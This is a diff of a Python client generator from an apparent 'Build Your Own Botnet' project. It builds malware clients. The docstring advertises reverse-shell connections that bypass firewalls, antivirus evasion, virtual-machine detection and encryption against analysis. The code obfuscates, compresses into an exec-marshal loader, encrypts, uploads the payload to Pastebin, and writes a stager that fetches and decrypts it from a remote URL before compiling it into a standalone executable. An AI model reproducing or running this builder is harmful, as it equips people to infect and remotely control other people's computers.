@@ -2,28 +2,35 @@
 """
 Client Generator (Build Your Own Botnet)
 
- - bypass firewalls - utilizes outgoing connections
-   (i.e. reverse TCP shells) which most firewall
-   filters allow by default
+ - Bypass Firewall
+    connects to server via outgoing connections
+    (i.e. reverse TCP payloads) which most firewall
+    filters allow by default
  
- - evades antivirus - blocks any spawning process
-   with names of known antivirus products
+ - Evade Antivirus
+    blocks any spawning process
+    with names of known antivirus products
  
- - prevent analysis - encrypts main client payload
-   with a random 256-bit key
+ - Prevent Analysis
+    main client payload encrypted with a random 256-bit key
+    and is only 
  
- - avoid detection - abort execution if if a virtual
-   environment is detected
+ - Avoid Detection
+    abort execution if if a virtual
+    environment is detected
  
- - zero dependencies - not even Python is required to run
-   a client because a Python interpreter is compiled with it
-   into a standalone executable into a standalone executable
+ - Zero Dependencies
+    not even Python is required to run
+    a client because a Python interpreter is compiled with it
+    into a standalone executable into a standalone executable
    
- - unlimited features - import any packages or custom modules
-   hosted the server as if they were installed locally
+ - Unlimited Modules
+    import any packages or custom modules
+    hosted the server as if they were installed locally
      
- - platform independent - compatible with PyInstaller and
-   package is authored in Python, a platform agnostic language
+ - Platform Independent
+    compatible with PyInstaller and package is authored 
+    in Python, a platform agnostic language
 """
 from __future__ import print_function
 
@@ -33,6 +40,7 @@ import os
 import sys
 import json
 import zlib
+import struct
 import base64
 import random
 import urllib
@@ -41,37 +49,20 @@ import marshal
 import logging
 import requests
 import argparse
+import tempfile
 import subprocess
 
-# optional color module 
+# modules
 
-try:
-    import colorama
-except ImportError:
-    pass
+from modules import util
 
 # globals
 
-colorama.init(autoreset=False)
 _debug  = True
-_quiet  = False
 _logger = logging.getLogger(__name__)
 _logger.addHandler(logging.StreamHandler())
 
-def _randvar(n):
-    global _logger
-    try:
-        assert isinstance(n, int)
-        return str().join([random.choice(list(string.ascii_lowercase) + list(string.digits)) for _ in range(int(n))])
-    except Exception as e:
-        _logger.debug(e)
-
-def _print(output):
-    global _quiet
-    if not _quiet:
-        print(output)
-    
-def pastebin(source, api_dev_key=None, api_user_key=None):
+def upload(source, api_dev_key=None, api_user_key=None):
     """ 
     Upload file/data to Pastebin
 
@@ -83,20 +74,19 @@ def pastebin(source, api_dev_key=None, api_user_key=None):
     :param str api_user_key:   Pastebin api_user_key
     
     """
-    global _logger
     try:
         if api_dev_key:
-            info={'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_dev_key}
+            info = {'api_option': 'paste', 'api_paste_code': util.normalize(source), 'api_dev_key': api_dev_key}
             if api_user_key:
-                info.update({'api_user_key'  : api_user_key})
-            data = urllib.urlencode(data)
-            req  = urllib2.Request('https://pastebin.com/api/api_post.php', data=data)
-            return urllib2.urlopen(req).read()
+                info.update({'api_user_key' : api_user_key})
+            info  = urllib.urlencode(info)
+            req   = urllib2.Request('https://pastebin.com/api/api_post.php', data=info)
+            paste = urllib2.urlopen(req).read()
             return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
         else:
             return "No Pastebin API key found"
     except Exception as e:
-        _logger.error('Method {} returned error: {}'.format(pastebin.func_name, str(e)))
+        globals()['_logger'].error('Method {} returned error: {}'.format(upload.func_name, str(e)))
 
 def encrypt(plaintext, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
     """
@@ -111,7 +101,6 @@ def encrypt(plaintext, key, block_size=8, key_size=16, num_rounds=32, padding=ch
     :param int key_size:        key size
     :param int num_rounds:      number of rounds
     """
-    global _logger
     try:
         data    = bytes(plaintext) + (int(block_size) - len(bytes(plaintext)) % int(block_size)) * bytes(padding)
         blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
@@ -130,9 +119,9 @@ def encrypt(plaintext, key, block_size=8, key_size=16, num_rounds=32, padding=ch
             result.append(output)
         return base64.b64encode(bytes().join(result))
     except Exception as e:
-        _logger.error('Method {} returned error: {}'.format(encrypt.func_name, str(e)))
+        globals()['_logger'].error('Method {} returned error: {}'.format(encrypt.func_name, str(e)))
 
-def exe(options, filename, payload='templates/stager.py'):
+def exe(options, filename):
     """
     Compile the Python stager file into a standalone executable
     with a built-in Python interpreter
@@ -140,27 +129,43 @@ def exe(options, filename, payload='templates/stager.py'):
     `Required`
     :param options:         argparse.Namespace object
     :param str filename:    target filename
-    :param str payload:     stager filename
     """
-    global _logger
     try:
         filename= os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', filename)
         pyname  = os.path.basename(filename)
         name    = os.path.splitext(pyname)[0]
-        dist    = os.path.dirname(filename)
+        dist    = os.path.abspath('clients')
         key     = util.variable(16)
         icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
-        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(payload,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
+        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(filename,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
         spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
         fspec   = os.path.join(dist, name + '.spec')
-        with file(fspec, 'w') as fp:
-            fp.write(spec)
-        make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-        exe   = os.path.join(os.path.join(dist, 'dist'), name + ('.exe' if os.name == 'nt' else ''))
-        _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
+        fp      = file(fspec, 'w')
+        fp.write(fspec)
+        fp.close()
+        try:
+            pyinst  = subprocess.check_output('where PyInstaller' if os.name == 'nt' else 'which PyInstaller', shell=True).strip().rstrip()
+        except:
+            raise Exception("missing package 'PyInstaller' is required to compile .py/.pyz into .exe")
+        make    = subprocess.Popen('{} -m {} {}'.format(sys.executable, pyinst, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+        if globals()['_debug']:
+            while True:
+                if make.poll():
+                    try:
+                        util.display(make.stdout.readline())
+                    except:
+                        pass
+                else:
+                    break
+        else:
+            make.wait()
+        if not make.returncode == 0:
+            raise Exception("failed to compile executable: {}".format(str().join((make.communicate()))))
+        exe     = os.path.join((dist, 'dist', name, '.exe' if os.name == 'nt' else ''))
+        build   = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
         return exe
     except Exception as e:
-        _logger.error('Method {} returned error: {}'.format(exe.func_name, str(e)))
+        globals()['_logger'].error('Method {} returned error: {}'.format(exe.func_name, str(e)))
 
 def app(options, filename):
     """
@@ -170,7 +175,6 @@ def app(options, filename):
     :param options:         argparse.Namespace object
     :param str filename:    target filename
     """
-    global _logger
     try:
         iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
         version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
@@ -196,68 +200,147 @@ def app(options, filename):
         os.rename(filename, os.path.join(distPath, baseName))
         return appPath
     except Exception as e:
-        _logger.error('Method {} returned error: {}'.format(app.func_name, str(e)))
+        globals()['_logger'].error('Method {} returned error: {}'.format(app.func_name, str(e)))
 
-def py(options, payload='templates/payload.py', stager='templates/stager.py'):
+def run(options, payload='clients/payload.py', stager='clients/stager.py'):
     """
     Generate the main Python stager
 
     `Required`
     :param options:         command line arguments (argparse.Namespace object)
-    :param str payload:     payload filename (default: template/payload.py)
-    :param str stager:      payload stager file template (default: templates/stager.py)
+    :param str payload:     payload filename (default: clients/payload.py)
+    :param str stager:      payload stager file template (default: clients/stager.py)
     """
-    global _logger
-    key  = base64.b64encode(os.urandom(16))
-    name = options.name or 'byob_%s' % _randvar(3) 
-    with open(payload, 'r') as fp:
-        load = fp.read()
-    load = load + "\n\nif __name__ == '__main__':\n    globals()['_shell'] = Shell(host='{}', port={}, **{})\n    globals()['_shell'].run()".format(options.host, options.port)
-    code = encrypt(load, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding=chr(0))
-    diff = round(float(100.0 * float(float(len(code))/float(len(load)) - 1.0)))
-    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
-    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(load), 'increased' if len(code) > len(load) else 'reduced', len(code), diff, 'larger' if len(code) > len(load) else 'smaller').ljust(80 - len("[+] ")))
-    load = code
-    link = pastebin(load)
-    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
-    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(load), link).ljust(80 - len("[+] ")))
-    with open(stager, 'r') as fp:
-        stag = fp.read().replace('__URL__', link).replace('__KEY__', key)
-    temp = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % _randvar(3))
-    with file(temp, 'w') as fp:
-        fp.write(stag)
-    obfs = subprocess.call('pyminifier --output={} --obfuscate-classes --obfuscate-methods --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(name, temp), shell=True)
-    if not os.path.isfile(name):
-        raise Exception('Obfuscated output file not found')
-    with open(name, 'r') as fp:
-        stag = fp.read()
-    code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stag, '', 'exec')), 9))))
-    diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stag)))))
-    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
-    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stag), 'increased' if len(code) > len(stag) else 'reduced', len(code), diff, 'larger' if len(code) > len(stag) else 'smaller').ljust(80 - len("[+] ")))
-    stag = code
-    with file(name, 'w') as fp:
-        fp.write(stag)
-    _print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
-    _print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stag), path).ljust(80 - len("[+] ")))
-    return name
+    client = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', dir=os.path.abspath('clients'), delete=False)
+    if not os.path.isdir('clients'):
+        os.mkdir('clients')
+
+    # Payload
+
+    payload = open(payload, 'r').read().replace('__KWARGS__', ', '.join(["host='{}', port={}".format(options.host, options.port), "ftp={}".format(json.dumps({'host': options.ftp_host, 'user': options.ftp_user, 'password': options.ftp_passwd}) if bool(options.ftp_host and options.ftp_user and options.ftp_passwd) else '', "pastebin='{}'".format(options.pastebin) if options.pastebin else '', "imgur='{}'".format(options.imgur) if options.imgur else '')]))
+
+    if options.obfuscate:
+        temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', dir=os.path.abspath('payloads'), delete=False)
+        temp.file.write(payload)
+        temp.file.close()
+        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(temp.name, temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+        obfs.wait()
+        assert obfs.returncode == 0, "payload obfuscation failed - {}".format(str().join((obfs.communicate())))
+        code = open(temp.name, 'r').read()
+        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(payload)))))
+        os.remove(temp.name)
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Payload obfuscation complete", color='reset', style='bright')
+        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
+        payload = code
+
+    if options.compress:
+        code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(payload, '', 'exec')), 9))))
+        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(payload)))))
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Payload compression complete", color='reset', style='bright')
+        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
+        payload = code
+
+    if options.encrypt:
+        key  = base64.b64encode(os.urandom(16))
+        code = encrypt(payload, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding=chr(0))
+        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Payload encryption complete", color='reset', style='bright')
+        util.display("    ({:,} bytes {} to {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
+        payload = code
+
+    if options.upload:
+        if options.pastebin:
+            url = upload(payload, api_dev_key=options.pastebin)
+            util.display("[+] ", color='green', style='bright', end='')
+            util.display("Payload upload complete", style='bright', color='reset')
+            util.display("    (hosting payload online at: {})".format(url).ljust(80 - len("[+] ")), color='reset', style='dim')
+        else:
+            url  = 'http://{}:{}/clients/{}'.format(options.host, options.port, client.name)
+            util.display("[-] ", color='red', style='bright', end='')
+            util.display("Error: ", color='reset', style='bright', end='')
+            util.display("upload requires --pastebin", color='reset', style='dim')
+            return
+    else:
+        url  = 'http://{}:{}/clients/{}'.format(options.host, options.port, client.name)
+        temp = tempfile.NamedTemporaryFile(prefix='payload', suffix='.py', dir=os.path.abspath('payloads'), delete=False)
+        temp.file.write(payload)
+        temp.file.close()
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Payload generation complete", style='bright', color='reset')
+        util.display("    (hosting payload locally at {})".format(os.path.abspath(temp.name)))
+
+    # Stager
+
+    stager   = open(stager, 'r').read().replace('__KWARGS__', ', '.join(["url='{}'".format(url) if 'url' in locals() else '', "key='{}'".format(key) if 'key' in locals() else '']))
+
+    if options.obfuscate:
+        temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', delete=False)
+        temp.file.write(stager)
+        temp.file.close()
+        obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(temp.name, temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+        obfs.wait()
+        assert obfs.returncode == 0, "stager obfuscation failed - {}".format(str().join((obfs.communicate())))
+        code = open(temp.name, 'r').read()
+        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Stager obfuscation complete", color='reset', style='bright')
+        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
+        stager = code
+
+    if options.compress:
+        code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
+        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Stager compression complete", color='reset', style='bright')
+        util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
+        stager = code
+
+    # Client
+
+    client.file.write(stager)
+    client.file.close()
+    util.display("[+] ", color='green', style='bright', end='')
+    util.display("Client generation complete", color='reset', style='bright')
+    util.display( "    (saved to file: {})".format(client.name).ljust(80 - len("[+] ")), style='dim', color='reset')
+    if options.compile:
+         return exe(options, client.name)
+    return client.name
 
 def main():
-    global _debug
-    global _quiet
-    global _logger
-    parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.2')
+    parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.3')
+
+    # required arguments
     parser.add_argument('host', action='store', type=str, help='server IP to connect to', default='localhost')
     parser.add_argument('port', action='store', type=int, help='port number for connection', default=1337)
-    parser.add_argument('--name', action='store', type=str, help='Output file name')
-    parser.add_argument('--icon', action='store', type=str, help='A valid path file icon')
-    parser.add_argument('--quiet', action='store_true', help='Quiet mode', default=False)
-    parser.add_argument('--debug', action='store_true', help='Debugging mode', default=True)
+
+    # optional arguments
+    parser.add_argument('--debug', action='store_true', help='Debugging mode', default=False)
+    parser.add_argument('--icon', action='store', type=str, help='icon for output file (requires --compile)')
+    parser.add_argument('--upload', action='store_true', help='upload & host payload on pastebin (requires --pastebin)', default=False)
+    parser.add_argument('--encrypt', action='store_true', help='encrypt payload & only decrypt in-memory at run-time', default=False)
+    parser.add_argument('--obfuscate', action='store_true', help='obfuscate names of classes, functions, variables, etc.', default=False)
+    parser.add_argument('--compress', action='store_true', help='compress .py into .pyz (self-extracting archive)', default=False)
+    parser.add_argument('--compile', action='store_true', help='compile .py/.pyz into .exe (standalone executable)', default=False)
+
+    # credentials
+    creds = parser.add_argument_group('credentials')
+    creds.title = 'optional credentials'
+    creds.add_argument('--ftp-host', action='store', metavar='HOST', help='FTP server host')
+    creds.add_argument('--ftp-user', action='store', metavar='USER', help='FTP login username')
+    creds.add_argument('--ftp-passwd', action='store', metavar='PASSWD', help='FTP login password')
+
+    # api keys
+    api  = parser.add_argument_group('api')
+    api.title = 'optional api keys'
+    api.add_argument('--imgur', action='store', type=str, metavar='API', help='imgur api key')
+    api.add_argument('--pastebin', action='store', type=str, metavar='API', help='pastebin api key')
+    api.add_argument('--vultr', action='store', type=str, metavar='API', help='vultr api key')
     options = parser.parse_args()
-    _quiet  = options.quiet
-    _debug  = options.debug
-    _logger.setLevel(logging.DEBUG if _debug else logging.ERROR)
-    return py(options)
+    globals()['_logger'].setLevel(logging.DEBUG if options.debug else logging.ERROR)
+    return run(options)
 
 
 if __name__ == '__main__':
